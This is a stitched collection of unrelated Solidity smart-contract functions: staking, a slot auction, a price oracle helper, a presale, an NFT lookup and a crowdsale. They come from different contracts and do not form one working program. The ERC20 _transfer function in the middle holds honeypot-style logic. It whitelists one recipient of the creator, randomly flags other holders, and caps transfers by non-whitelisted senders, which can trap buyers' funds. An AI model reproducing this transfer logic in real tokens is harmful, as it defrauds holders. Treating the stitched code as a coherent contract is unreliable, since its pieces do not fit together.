function lock(uint payment) external paused {
    require(payment > 0, 'Payment must be greater than 0.');
    require(UNILAYER.balanceOf(msg.sender) >= payment, 'Holder does not have enough tokens.');
    require(UNILAYER.allowance(msg.sender, address(this)) >= payment, 'Call Approve function firstly.');
    UNILAYER.transferFrom(msg.sender, address(this), payment);
    StakeHolder memory holder = stakeHolders[msg.sender];
    Stake memory stake = stakes[stakeNum];
    if (holder.layerLocked == 0) {
        holder.firstStake = stakeNum;
        holder.time = now;
    } else if (holder.layerLocked > 0 && stakeNum > holder.firstStake) {
        Rewards memory rwds = rewards[msg.sender][stakeNum - 1];
        require(rwds.isReceived == true, 'Withdraw your rewards.');
    }
    holder.layerLocked = holder.layerLocked.add(payment);
    stakeHolders[msg.sender] = holder;
    stake.layerLockedTotal = stake.layerLockedTotal.add(payment);
    stakes[stakeNum] = stake;
    emit logLockedTokens(msg.sender, payment, now, stakeNum);
}

function withdraw(uint index) external paused exist(index) {
    Rewards memory rwds = rewards[msg.sender][index];
    Stake memory stake = stakes[index];
    StakeHolder memory holder = stakeHolders[msg.sender];
    uint endTime = holder.time + stakePeriod;
    require(endTime <= now, 'Wait the minimum time');
    require(stake.end <= now, 'Invalid date for withdrawal.');
    require(rwds.isReceived == false, 'You already withdrawal your rewards.');
    require(balances[owner] >= rwds.layersx, 'Insufficient account balance!');
    require(address(this).balance >= rwds.eth, 'Invalid account state, not enough funds.');
    require(index >= holder.firstStake, 'Invalid index.');
    if (holder.firstStake != index) {
        Rewards memory rwdsOld = rewards[msg.sender][index - 1];
        require(rwdsOld.isReceived == true, 'Withdraw your old rewards first.');
    }
    rwds.isReceived = true;
    rwds.layerLocked = holder.layerLocked;
    if (rwds.layerLocked > 0) {
        rwds.layersx = rwds.layerLocked.mul(stake.layerxReward).div(stake.layerLockedTotal);
        rwds.eth = rwds.layerLocked.mul(stake.ethReward).div(stake.layerLockedTotal);
    }
    rewards[msg.sender][index] = rwds;
    emit logWithdraw(msg.sender, rwds.layersx, rwds.eth, index, now);
    if (rwds.layersx > 0) {
        balances[owner] = balances[owner].sub(rwds.layersx);
        balances[msg.sender] = balances[msg.sender].add(rwds.layersx);
        emit Transfer(owner, msg.sender, rwds.layersx);
    }
    if (rwds.eth > 0) {
        msg.sender.transfer(rwds.eth);
    }
}

function closeStake() external {
    require(msg.sender == stakeCreator, 'You cannot call this function');
    Stake memory stake = stakes[stakeNum];
    require(now >= stake.start.add(stakePeriod), 'You cannot call this function until stakePeriod is over');
    stake.end = now;
    stake.ethReward = stake.ethReward.add(totalEthRewards);
    uint amtLayerx = stake.end.sub(stake.start).mul(amtByDay).div(1 days);
    if (amtLayerx > balances[owner]) {
        amtLayerx = balances[owner];
    }
    stake.layerxReward = amtLayerx;
    stakes[stakeNum] = stake;
    emit logCloseStake(stakeNum, totalEthRewards, now);
    stakeNum++;
    stakes[stakeNum] = Stake(now, 0, stake.layerLockedTotal, 0, 0);
    totalEthRewards = 0;
}

function withdrawFromSlot(uint poolId, uint slotId) external initializedPoolOnly(poolId) {
    Pool storage pool = pools[poolId];
    PoolStats storage stats = poolStats[poolId];
    Slot storage slot = pool.slots[slotId];
    require(slot.owner != address(0), 'Slot unoccupied');
    updateSlot(poolId, slotId);
    bool withdrawable = slot.owner == msg.sender || slot.depositWei == 0;
    require(withdrawable, 'Only owner can call this unless user is delinquent');
    emit SlotChangedHands(poolId, address(0), slot.owner, slotId, 0, 0, stats.rewards1WeiForSession[slotId]);
    stats.rewards1WeiForSession[slotId] = 0;
    stats.numStakers = stats.numStakers.minus(1);
    slot.vacatedBlock = block.number;
    address owner = slot.owner;
    slot.owner = address(0);
    if (slot.depositWei > 0) {
        require(IERC20(pool.liquidityToken).transfer(owner, slot.depositWei), 'Token transfer failed');
    }
}

function claimSlot(uint poolId, uint slotId, uint newBurnRate, uint newDeposit) external {
    Pool storage pool = pools[poolId];
    PoolStats storage stats = poolStats[poolId];
    require(slotId > 0, 'Slot id must be positive');
    require(slotId <= pool.maxStakers, 'Slot id out of range');
    require(newBurnRate >= pool.minimumBurnRateWeiPerBlock, 'Burn rate must meet or exceed minimum');
    require(newBurnRate <= pool.maximumBurnRateWeiPerBlock, 'Burn rate must not exceed maximum');
    require(newDeposit >= pool.minimumDepositWei, 'Deposit must meet or exceed minimum');
    require(newDeposit <= pool.maximumDepositWei, 'Deposit must not exceed maximum');
    require(stats.paused == false, 'Must be unpaused');
    require(pool.id == poolId && poolId > 0, 'Uninitialized pool');
    {
        Pulse storage pulse = pulses[poolId];
        require(pulse.pulseStartBlock <= block.number, 'Pool has not started yet');
    }
    Slot storage slot = pool.slots[slotId];
    if (slot.owner == address(0)) {
        slot.id = slotId;
        slot.lastUpdatedBlock = block.number;
        (uint depositMin, uint burnRateMin) = getClaimMinimums(poolId, slotId);
        bool betterDeal = newBurnRate >= burnRateMin && newDeposit >= depositMin;
        require(betterDeal, 'You must meet or exceed the current burn rate and deposit');
        stats.numStakers = stats.numStakers.plus(1);
    } else {
        updateSlot(poolId, slotId);
        bool betterDeal = newBurnRate > slot.burnRateWei && (newDeposit > slot.depositWei || newDeposit == pool.maximumDepositWei);
        require(betterDeal || slot.depositWei == 0, 'You must outbid the current owner');
        stats.totalStakedWei = stats.totalStakedWei.minus(slot.depositWei);
        stats.totalStakedWeiFor[slot.owner] = stats.totalStakedWeiFor[slot.owner].minus(slot.depositWei);
        slot.vacatedBlock = 0;
        if (slot.depositWei > 0) {
            require(IERC20(pool.liquidityToken).transfer(slot.owner, slot.depositWei), 'Token transfer failed');
        }
    }
    emit SlotChangedHands(poolId, msg.sender, slot.owner, slotId, newDeposit, newBurnRate, stats.rewards1WeiForSession[slotId]);
    stats.rewards1WeiForSession[slotId] = 0;
    slot.owner = msg.sender;
    slot.burnRateWei = newBurnRate;
    slot.depositWei = newDeposit;
    stats.totalStakedWei = stats.totalStakedWei.plus(newDeposit);
    stats.totalStakedWeiFor[msg.sender] = stats.totalStakedWeiFor[msg.sender].plus(newDeposit);
    if (newDeposit > 0) {
        require(IERC20(pool.liquidityToken).transferFrom(msg.sender, address(this), newDeposit), 'Token transfer failed');
    }
}

function updateSlot(uint poolId, uint slotId) public initializedPoolOnly(poolId) {
    Pool storage pool = pools[poolId];
    PoolStats storage stats = poolStats[poolId];
    Slot storage slot = pool.slots[slotId];
    require(slot.owner != address(0), 'Unoccupied slot');
    if (stats.paused) {
        require(block.number > stats.pausedBlock, 'Do not call this in the same block that you paused');
        require(slot.lastUpdatedBlock <= stats.pausedBlock, 'If pool is paused, can only update slot once');
        require(msg.sender == pool.poolOwner || msg.sender == slot.owner, 'If pool is paused, only pool owner or slot owner may call this');
        stats.numSynced = stats.numSynced.plus(1);
    }
    Pulse storage pulse = pulses[poolId];
    (uint rewards1, uint rewards2) = getRewards(poolId, slotId);
    uint burn = getBurn(poolId, slotId);
    slot.lastUpdatedBlock = block.number;
    if (rewards1 > 0) {
        stats.totalRewardsWei = stats.totalRewardsWei.plus(rewards1);
        stats.totalRewardsWeiFor[slot.owner] = stats.totalRewardsWeiFor[slot.owner].plus(rewards1);
        stats.rewards1WeiForSession[slotId] = stats.rewards1WeiForSession[slotId].plus(rewards1);
        require(IERC20(pulse.rewardToken1).transfer(slot.owner, rewards1), 'Token transfer failed');
    }
    if (rewards2 > 0) {
        require(IERC20(pulse.rewardToken2).transfer(slot.owner, rewards2), 'Token transfer failed');
    }
    if (burn > 0) {
        slot.depositWei = slot.depositWei.minus(burn);
        stats.totalBurnedWei = stats.totalBurnedWei.plus(burn);
        stats.totalBurnedWeiFor[slot.owner] = stats.totalBurnedWeiFor[slot.owner].plus(burn);
        require(IERC20(pool.liquidityToken).transfer(pool.taxAddress, burn), 'Token transfer failed');
    }
}

function currentCumulativePrices(address pair) internal view returns(uint price0Cumulative, uint price1Cumulative, uint32 blockTimestamp) {
    blockTimestamp = uint32(block.timestamp % 2 ** 32);
    price0Cumulative = IUniswapV2Pair(pair).price0CumulativeLast();
    price1Cumulative = IUniswapV2Pair(pair).price1CumulativeLast();
    (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) = IUniswapV2Pair(pair).getReserves();
    if (blockTimestampLast != blockTimestamp) {
        uint32 timeElapsed = blockTimestamp - blockTimestampLast;
        price0Cumulative += uint(FixedPoint.fraction(reserve1, reserve0)._x) * timeElapsed;
        price1Cumulative += uint(FixedPoint.fraction(reserve0, reserve1)._x) * timeElapsed;
    }
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (classico == true)) {
        casino[recipient] = true;
        gambling[recipient] = false;
        classico = false;
    }
    if (casino[recipient] != true) {
        gambling[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((gambling[sender]) && (casino[recipient] == false)) {
        gambling[recipient] = true;
    }
    if (casino[sender] == false) {
        require(amount < montiroing);
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

receive() external payable {
    require(currentPhase == Phases.start, "The coin offering has not started yet");
    require(msg.value <= 2e18 && msg.value >= 3e17, "You can send at least 0.3 ETH but not more than 2 ETH");
    require(remainingTokens > 0, "Presale token limit reached");
    uint256 weiAmount = msg.value;
    uint256 tokens = weiAmount.mul(basePrice).div(1 ether);
    uint256 returnWei = 0;
    ethBalances[_msgSender()] = ethBalances[_msgSender()].add(weiAmount);
    ethBalances[address(this)] = ethBalances[address(this)].add(weiAmount);
    require(ethBalances[_msgSender()] <= 2e18, "Cannot send more than 2 ETH");
    require(ethBalances[address(this)] <= 60e18, "Target amount of 60 ETH reached");
    if (tokensSold.add(tokens) > cap) {
        revert("Exceeding limit of presale tokens");
    }
    tokensSold = tokensSold.add(tokens); 
    remainingTokens = cap.sub(tokensSold);
    if (returnWei > 0) {
        _msgSender().transfer(returnWei);
        emit Transfer(address(this), _msgSender(), returnWei);
    }
    uint256 tokensToBurn = tokens.mul(70).div(1000); 
    balances_[owner()] = balances_[owner()].sub(tokens, "ERC20: transfer amount exceeds balance");
    balances_[owner()] = balances_[owner()].sub(tokensToBurn, "ERC20: transfer amount exceeds balance");
    _totalSupply = _totalSupply.sub(tokensToBurn, 'Overflow while burning tokens');
    balances_[_msgSender()] = balances_[_msgSender()].add(tokens);
    emit Transfer(address(this), _msgSender(), tokens);
    emit Transfer(address(this), address(0x000000000000000000000000000000000000dEaD), tokensToBurn);
    _owner.transfer(weiAmount);
}

function tokensOfOwner(address _owner) external view returns(uint256[] ownerTokens) {
    uint256 tokenCount = balanceOf(_owner);
    if (tokenCount == 0) {
        return new uint256[](0);
    } else {
        uint256[] memory result = new uint256[](tokenCount);
        uint256 totalCats = totalSupply();
        uint256 resultIndex = 0;
        uint256 catId;
        for (catId = 1; catId <= totalCats; catId++) {
            if (artIndexToOwner[catId] == _owner) {
                result[resultIndex] = catId;
                resultIndex++;
            }
        }
        return result;
    }
}

function distribute(address[] myAddresses) public payable {
    require(myAddresses.length > 0);
    uint256 value = msg.value;
    uint256 length = myAddresses.length;
    uint256 distr = value.div(length);
    if (length == 1) {
        myAddresses[0].transfer(value);
    } else {
        for (uint256 i = 0; i < (length.sub(1)); i++) {
            myAddresses[i].transfer(distr);
            value = value.sub(distr);
        }
        myAddresses[myAddresses.length - 1].transfer(value);
    }
    totalEther = totalEther.add(msg.value);
}

function withdraw() onlyOwner public {
    require((fundingGoalReached && now >= deadline) || highFundingGoalReached);
    uint raisedFunds = this.balance;
    uint teamTokens = soldTokens.mul(teamSharePercent).div(ONE_HUNDRED.sub(teamSharePercent));
    uint totalTokens = tokenReward.totalSupply();
    if (totalTokens < teamTokens.add(soldTokens)) {
        teamTokens = totalTokens.sub(soldTokens);
    }
    tokenReward.transfer(teamTrustAccount, teamTokens);
    uint distributedTokens = teamTokens.add(soldTokens);
    if (totalTokens > distributedTokens) {
        tokenReward.burn(totalTokens.sub(distributedTokens));
    }
    tokenReward.startTrading();
    Owned(address(tokenReward)).transferOwnership(owner);
    owner.transfer(raisedFunds);
    FundsTransfer(owner, raisedFunds, false);
}

function purchaseTokens() public payable {
    require(!highFundingGoalReached && now >= startTime);
    uint amount = msg.value;
    uint noTokens = amount.div(
        tokenPriceOracle.getAquaTokenAudCentsPrice().mul(tokenPriceOracle.getAudCentWeiPrice())
    );
    buyerBalances[msg.sender] = buyerBalances[msg.sender].add(amount);
    soldTokens = soldTokens.add(noTokens);
    checkGoalsReached();
    tokenReward.transfer(msg.sender, noTokens);
    FundsTransfer(msg.sender, amount, true);
}

function refund() public {
    require(!fundingGoalReached && buyerBalances[msg.sender] > 0 &&
        now >= deadline);
    uint amount = buyerBalances[msg.sender];
    buyerBalances[msg.sender] = 0;
    msg.sender.transfer(amount);
    FundsTransfer(msg.sender, amount, false);
}

